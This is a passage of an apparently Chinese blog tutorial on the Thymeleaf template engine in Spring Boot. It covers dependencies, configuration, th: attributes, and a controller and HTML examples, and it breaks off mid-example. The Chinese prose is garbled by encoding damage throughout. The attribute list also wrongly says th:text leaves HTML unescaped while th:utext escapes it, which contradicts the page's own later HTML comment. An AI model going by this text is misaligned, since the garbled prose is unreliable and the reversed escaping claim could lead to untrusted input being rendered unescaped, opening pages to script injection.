title="Thymeleafæ¨¡æ¿å¼•æ“"></a>Thymeleafæ¨¡æ¿å¼•æ“</h3><p>å®˜æ–¹ç½‘ç«™ï¼š<a href="https://www.thymeleaf.org/index.html">https://www.thymeleaf.org/index.html</a></p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/u010448530/article/details/113244611">https://blog.csdn.net/u010448530/article/details/113244611</a></p><p>å¯¼å…¥ä¾èµ–ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨application.propertiesä¸­é…ç½®thymleafï¼š</p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">spring.thymeleaf.mode</span> <span class="token punctuation">=</span> <span class="token value attr-value">LEGACYHTML5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ï¼ˆè¿™ä¸ªé…ç½®ä¸æ˜¯å¿…é¡»çš„ï¼Œä½†æ˜¯spring.thymeleaf.modeçš„é»˜è®¤å€¼æ˜¯HTML5ï¼Œå…¶å®æ˜¯ä¸€ä¸ªå¾ˆä¸¥æ ¼çš„æ£€æŸ¥ï¼Œæ”¹ä¸ºLEGACYHTML5å¯ä»¥å¾—åˆ°ä¸€ä¸ªå¯èƒ½æ›´å‹å¥½äº²åˆ‡çš„æ ¼å¼è¦æ±‚ï¼‰</p><p>templatesæ–‡ä»¶å¤¹ä¸‹åˆ›å»ºtest.htmlï¼Œç„¶ååˆ›å»ºä¸€ä¸ªIndexControlleræ§åˆ¶å™¨ï¼ˆåœ¨templatesç›®å½•ä¸‹çš„æ‰€æœ‰é¡µé¢ï¼Œåªèƒ½é€šè¿‡controlleræ¥è·³è½¬ï¼Œéœ€è¦thymeleafæ¨¡æ¿å¼•æ“çš„æ”¯æŒï¼‰</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709220439280.png" alt="image-20240709220439280"></p><hr><h4 id="Thymeleafè¯­æ³•"><a href="#Thymeleafè¯­æ³•" class="headerlink" title="Thymeleafè¯­æ³•"></a>Thymeleafè¯­æ³•</h4><p>å…ˆçœ‹ä¸€ä¸‹thymeleafçš„æºç ï¼Œåœ¨ ThymeleafProperties.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ConfigurationProperties</span><span class="token punctuation">(</span>    prefix <span class="token operator">=</span> <span class="token string">"spring.thymeleaf"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThymeleafProperties</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Charset</span> <span class="token constant">DEFAULT_ENCODING</span><span class="token punctuation">;</span>    <span class="token comment">//è§„åˆ™å‰ç¼€</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">DEFAULT_PREFIX</span> <span class="token operator">=</span> <span class="token string">"classpath:/templates/"</span><span class="token punctuation">;</span>    <span class="token comment">//è§„åˆ™åç¼€</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">DEFAULT_SUFFIX</span> <span class="token operator">=</span> <span class="token string">".html"</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>thymeleafè‡ªåŠ¨é…ç½®äº†è§„åˆ™å‰ç¼€å’Œåç¼€ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬æŠŠhtmlé¡µé¢æ”¾åœ¨<code>calsspath:/templates/</code>ä¸‹ï¼Œthymeleafå°±èƒ½è‡ªåŠ¨æ¸²æŸ“</p><p>ä¾æ—§æ˜¯å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­æ¥æŒ‡å®šæ¨¡æ¿ï¼š</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>  <span class="token key atrule">thymeleaf</span><span class="token punctuation">:</span>    <span class="token key atrule">prefix</span><span class="token punctuation">:</span> classpath<span class="token punctuation">:</span>/templates/    <span class="token key atrule">check-template-location</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>    <span class="token key atrule">cache</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>    <span class="token key atrule">suffix</span><span class="token punctuation">:</span> .html    <span class="token key atrule">encoding</span><span class="token punctuation">:</span> UTF<span class="token punctuation">-</span><span class="token number">8</span>    <span class="token key atrule">content-type</span><span class="token punctuation">:</span> text/html    <span class="token key atrule">mode</span><span class="token punctuation">:</span> HTML5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>prefixï¼šæŒ‡å®šæ¨¡æ¿æ‰€åœ¨çš„ç›®å½•</li><li>check-tempate-location: æ£€æŸ¥æ¨¡æ¿è·¯å¾„æ˜¯å¦å­˜åœ¨</li><li>cache: æ˜¯å¦ç¼“å­˜ï¼Œå¼€å‘æ¨¡å¼ä¸‹è®¾ç½®ä¸ºfalseï¼Œé¿å…æ”¹äº†æ¨¡æ¿è¿˜è¦é‡å¯æœåŠ¡å™¨ï¼Œçº¿ä¸Šè®¾ç½®ä¸ºtrueï¼Œå¯ä»¥æé«˜æ€§èƒ½</li><li>encoding&amp;content-typeï¼šä¸Servletä¸­è®¾ç½®è¾“å‡ºå¯¹åº”å±æ€§æ•ˆæœä¸€è‡´</li><li>modeï¼šè§å®˜ç½‘è¯´æ˜</li></ul><hr><h5 id="thå±æ€§"><a href="#thå±æ€§" class="headerlink" title="thå±æ€§"></a>thå±æ€§</h5><blockquote><p>htmlæœ‰çš„å±æ€§ï¼ŒThymeleafåŸºæœ¬éƒ½æœ‰ï¼Œè€Œå¸¸ç”¨çš„å±æ€§å¤§æ¦‚æœ‰ä¸ƒå…«ä¸ªã€‚å…¶ä¸­thå±æ€§æ‰§è¡Œçš„ä¼˜å…ˆçº§ä»1~8ï¼Œæ•°å­—è¶Šä½ä¼˜å…ˆçº§è¶Šé«˜</p></blockquote><ol><li><code>th:insert</code>ï¼šä»£ç å—å¼•å…¥ï¼Œç±»ä¼¼çš„è¿˜æœ‰<code>th:replace</code>ï¼Œ<code>th:include</code>ï¼Œä¸‰è€…çš„åŒºåˆ«è¾ƒå¤§ï¼Œè‹¥ä½¿ç”¨ä¸æ°å½“ä¼šç ´åhtmlç»“æ„ï¼Œå¸¸ç”¨äºå…¬å…±ä»£ç å—æå–çš„åœºæ™¯ã€‚ä¼˜å…ˆçº§æœ€é«˜</li><li><code>th:each</code>ï¼šéå†å¾ªç¯å…ƒç´ ï¼Œå’Œ<code>th:text</code>æˆ–<code>th:value</code>ä¸€èµ·ä½¿ç”¨ã€‚æ³¨æ„è¯¥å±æ€§ä¿®é¥°çš„æ ‡ç­¾ä½ç½®ï¼Œè¯¦ç»†å¾€åçœ‹ã€‚</li><li><code>th:if</code>ï¼šæ¡ä»¶åˆ¤æ–­ï¼Œç±»ä¼¼çš„è¿˜æœ‰<code>th:unless</code>ï¼Œ<code>th:switch</code>ï¼Œ<code>th:case</code>ã€‚</li><li><code>th:object</code>ï¼šå£°æ˜å˜é‡ï¼Œä¸€èˆ¬å’Œ<code>*&#123;&#125;</code>ä¸€èµ·é…åˆä½¿ç”¨ï¼Œè¾¾åˆ°å·æ‡’çš„æ•ˆæœã€‚</li><li><code>th:attr</code>ï¼šä¿®æ”¹ä»»æ„å±æ€§ï¼Œå®é™…å¼€å‘ä¸­ç”¨çš„è¾ƒå°‘ï¼Œå› ä¸ºæœ‰ä¸°å¯Œçš„å…¶ä»–thå±æ€§å¸®å¿™ï¼Œç±»ä¼¼çš„è¿˜æœ‰<code>th:attrappend</code>ï¼Œ<code>th:attrprepend</code>ã€‚</li><li><code>th:value</code>ï¼šè®¾ç½®å½“å‰å…ƒç´ çš„valueå€¼ï¼Œç±»ä¼¼ä¿®æ”¹æŒ‡å®šå±æ€§çš„è¿˜æœ‰<code>th:src</code>ï¼Œ<code>th:href</code>ã€‚</li><li><code>th:text</code> ï¼šè®¾ç½®å½“å‰å…ƒç´ çš„æ–‡æœ¬å†…å®¹ï¼Œç›¸åŒåŠŸèƒ½çš„è¿˜æœ‰<code>th:utext</code>ï¼Œä¸¤è€…çš„åŒºåˆ«åœ¨äº<strong>å‰è€…ä¸ä¼šè½¬ä¹‰htmlæ ‡ç­¾</strong>ï¼Œåè€…ä¼šã€‚</li><li><code>th:fragment</code>ï¼šå®šä¹‰ä»£ç å—ï¼Œæ–¹ä¾¿è¢«<code>th:insert</code>å¼•ç”¨ã€‚ä¼˜å…ˆçº§æœ€ä½</li></ol><p>ä½¿ç”¨thymeleafå±æ€§éœ€è¦æ³¨æ„çš„ç‚¹ï¼š</p><ul><li><p>è‹¥è¦ä½¿ç”¨Thymeleafè¯­æ³•ï¼Œé¦–å…ˆè¦å£°æ˜åç§°ç©ºé—´ï¼š <code>xmlns:th=&quot;http://www.thymeleaf.org&quot;</code></p></li><li><p>è®¾ç½®æ–‡æœ¬å†…å®¹<code>th:text</code>ï¼Œè®¾ç½®inputçš„å€¼<code>th:value</code>ï¼Œå¾ªç¯è¾“å‡º<code>th:each</code>ï¼Œæ¡ä»¶åˆ¤æ–­<code>th:if</code>ï¼Œæ’å…¥ä»£ç å—<code>th:insert</code>ï¼Œå®šä¹‰ä»£ç å— <code>th:fragment</code>ï¼Œå£°æ˜å˜é‡<code>th:object</code></p></li><li><p><code>th:each</code>çš„ç”¨æ³•éœ€è¦æ ¼å¤–æ³¨æ„ï¼Œæ‰“ä¸ªæ¯”æ–¹ï¼šå¦‚æœä½ è¦å¾ªç¯ä¸€ä¸ªdivä¸­çš„pæ ‡ç­¾ï¼Œåˆ™<code>th:each</code>å±æ€§å¿…é¡»æ”¾åœ¨pæ ‡ç­¾ä¸Šã€‚è‹¥ä½ å°†<code>th:each</code>å±æ€§æ”¾åœ¨divä¸Šï¼Œåˆ™å¾ªç¯çš„æ˜¯å°†æ•´ä¸ªdivã€‚</p></li><li><p>å˜é‡è¡¨è¾¾å¼ä¸­æä¾›äº†å¾ˆå¤šçš„å†…ç½®æ–¹æ³•ï¼Œè¯¥å†…ç½®æ–¹æ³•æ˜¯ç”¨<code>#</code>å¼€å¤´ï¼Œè¯·ä¸è¦ä¸<code>#&#123;&#125;</code>æ¶ˆæ¯è¡¨è¾¾å¼å¼„æ··ã€‚</p></li><li><p><code>th:insert</code>ï¼Œ<code>th:replace</code>ï¼Œ<code>th:include</code> ä¸‰ç§æ’å…¥ä»£ç å—çš„æ•ˆæœç›¸ä¼¼ï¼Œä½†åŒºåˆ«å¾ˆå¤§ã€‚</p></li></ul><p>ä¾‹å­ï¼š</p><ol><li><p>å…ˆåœ¨controllerä¸­ç»‘å®šæ•°æ®</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">Person</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>ui<span class="token punctuation">.</span></span><span class="token class-name">Model</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token class-name">Model</span> model<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 1.ç»‘å®šä¸€ä¸ªå­—ç¬¦ä¸²</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span><span class="token string">"this is a &lt;b>String&lt;/b>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"msgUtext"</span><span class="token punctuation">,</span><span class="token string">"this is a &lt;b>String&lt;/b>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 2.ç»‘å®šä¸€ä¸ªpojoå¯¹è±¡</span>        <span class="token class-name">Person</span> per <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"per"</span><span class="token punctuation">,</span>per<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 3.ç»‘å®šä¸€ä¸ªlist</span>        <span class="token class-name">List</span> list<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>per<span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Azusa"</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"hina"</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"pers"</span><span class="token punctuation">,</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 4.ç»‘å®šä¸€ä¸ªmap</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"Boss"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"boss"</span><span class="token punctuation">,</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"map"</span><span class="token punctuation">,</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string">"test"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>åœ¨htmlä¸­ä½¿ç”¨thymeleafè¯­æ³•è·å–æ•°æ®</p><ul><li><p>å£°æ˜å‘½åç©ºé—´</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>th:text</code>å’Œ<code>th:value</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;msg&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--ä¸ä¼šè½¬ä¹‰htmlæ ‡ç­¾--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name"><span class="token namespace">th:</span>utext</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;msgUtext&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--th:value è®¾ç½®å½“å‰å…ƒç´ çš„valueå€¼ï¼Œå¸¸ç”¨ï¼Œä¼˜å…ˆçº§ä»…æ¯”th:texté«˜--></span>å§“åï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;per.name&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>å¹´é¾„ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;per.age&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/28/SpringBoot/image-20240709223856611.png" alt="image-20240709223856611"></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709224004960.png" alt="image-20240709224004960"></p></li><li><p><code>th:each</code>ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--th:each éå†åˆ—è¡¨ï¼Œå¸¸ç”¨ï¼Œä¼˜å…ˆçº§å¾ˆé«˜ï¼Œä»…æ­¤äºä»£ç å—çš„æ’å…¥ï¼Œéå†è¢«ä¿®é¥°çš„å…ƒç´ --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1px<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>200px<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>thead</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>ç¼–å·<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>å§“å<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>å¹´é¾„<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>æ“ä½œ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>thead</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tbody</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span> <span class="token attr-name"><span class="token namespace">th:</span>each</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>p:$&#123;pers&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>ç¼–å·<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;p.name&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;p.age&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>åˆ é™¤/ä¿®æ”¹<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tbody</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tbody</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span> <span class="token attr-name"><span class="token namespace">th:</span>each</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>p,pState:$&#123;pers&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;pState.index+1&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;p.name&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;p.age&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>åˆ é™¤/ä¿®æ”¹<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tbody</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/28/SpringBoot/image-20240709224536399.png" alt="image-20240709224536399"></p><p>å¯¹äº<code>th:each=&quot;p,:$&#123;pers&#125;</code>ï¼Œpæ˜¯å¾ªç¯çš„æ¯ä¸€é¡¹ï¼ŒpStateæ˜¯ä¸‹æ ‡å±æ€§ï¼ŒåŒ…æ‹¬ï¼š</p><pre 